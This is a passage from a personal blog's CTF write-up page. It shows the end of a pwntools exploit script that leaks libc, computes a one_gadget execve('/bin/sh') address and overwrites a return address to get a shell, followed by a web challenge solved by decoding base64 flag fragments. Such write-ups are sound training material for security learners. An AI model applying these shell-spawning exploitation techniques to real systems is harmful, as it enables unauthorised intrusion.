rl <span class="token operator">=</span> lambda <span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">recvline</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> lambda x<span class="token operator">:</span> p<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> lambda <span class="token operator">:</span> <span class="token function">u64</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token char">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> lambda <span class="token operator">:</span> <span class="token function">u32</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


def <span class="token function">set</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token operator">:</span>
    <span class="token function">sl</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    <span class="token function">sl</span><span class="token punctuation">(</span>f<span class="token string">"&#123;str(idx)&#125; 1 &#123;str(value)&#125;"</span><span class="token punctuation">)</span>


def <span class="token function">copy_idx2_data_to_idx1</span><span class="token punctuation">(</span>idx1<span class="token punctuation">,</span>idx2<span class="token punctuation">)</span><span class="token operator">:</span>
    <span class="token function">sl</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    <span class="token function">sl</span><span class="token punctuation">(</span>f<span class="token string">"&#123;str(idx1)&#125; 2 &#123;str(idx2)&#125;"</span><span class="token punctuation">)</span>

def <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token operator">:</span>
    <span class="token function">sl</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    <span class="token function">sl</span><span class="token punctuation">(</span>f<span class="token string">"&#123;str(idx)&#125; 1 &#123;str(value)&#125;"</span><span class="token punctuation">)</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">g</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
# <span class="token number">0x0000000000149708</span> <span class="token operator">:</span> xor r10d<span class="token punctuation">,</span> r10d <span class="token punctuation">;</span> mov eax<span class="token punctuation">,</span> r10d <span class="token punctuation">;</span> ret
    
# <span class="token number">0xebc85</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> r10<span class="token punctuation">,</span> rdx<span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">constraints</span><span class="token expression"><span class="token operator">:</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span>   <span class="token directive keyword">address</span> <span class="token expression">rbp<span class="token operator">-</span><span class="token number">0x78</span> is writable</span></span>
#   <span class="token punctuation">[</span>r10<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> r10 <span class="token operator">==</span> <span class="token constant">NULL</span>
#   <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> rdx <span class="token operator">==</span> <span class="token constant">NULL</span>

one_gadget <span class="token operator">=</span> <span class="token number">0xebc85</span>

<span class="token function">copy_idx2_data_to_idx1</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x40</span><span class="token punctuation">)</span>

<span class="token function">copy_idx2_data_to_idx1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span> <span class="token number">0x21a6a0</span><span class="token punctuation">)</span>
<span class="token function">copy_idx2_data_to_idx1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span> <span class="token number">0x21a6a0</span><span class="token punctuation">)</span>

<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x149708</span><span class="token punctuation">)</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> one_gadget<span class="token punctuation">)</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">compute</span> <span class="token expression">ret_addr and write to buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> </span></span>
<span class="token function">copy_idx2_data_to_idx1</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x70</span><span class="token punctuation">)</span>

<span class="token function">copy_idx2_data_to_idx1</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">g</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
<span class="token function">sl</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>



p<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="BeginnerTetris"><a href="#BeginnerTetris" class="headerlink" title="BeginnerTetris"></a>BeginnerTetris</h2><p>想找找success的逻辑，然后看到有两个base64 解密得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">ZmxhZ3tZT3UxcmVfZnIwbnQ&#x3D;

X0VuZF9tQXN0MXJfNl42fQ&#x3D;&#x3D;

flag&#123;YOu1re_fr0nt_End_mAst1r_6^6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/01/04/pwnable-kr/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/12/28/hackergame2023/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-01-02 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>52</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#pyjali"><span class="toc-article-text">pyjali</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#level-1"><span class="toc-article-text">level 1</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#level2"><span class="toc-article-text">level2</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#level3"><span class="toc-article-text">level3</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#level4"><span class="toc-article-text">level4</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#level5"><span class="toc-article-text">level5</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Reverse"><span class="toc-article-text">Reverse</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PWN"><span class="toc-article-text">PWN</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#TIVM-Checkin"><span class="toc-article-text">TIVM-Checkin</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Misc"><span class="toc-article-text">Misc</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#web-%E8%A1%A5"><span class="toc-article-text">web[补]</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#pwn"><span class="toc-article-text">pwn</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#heap1"><span class="toc-article-text">heap1</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#The-Legend-Of-ShellCode"><span class="toc-article-text">The Legend Of ShellCode</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#123go"><span class="toc-article-text">123go</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#reg"><span class="toc-article-text">reg</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#web"><span class="toc-article-text">web</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#BeginnerTetris"><span class="toc-article-text">BeginnerTetris</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
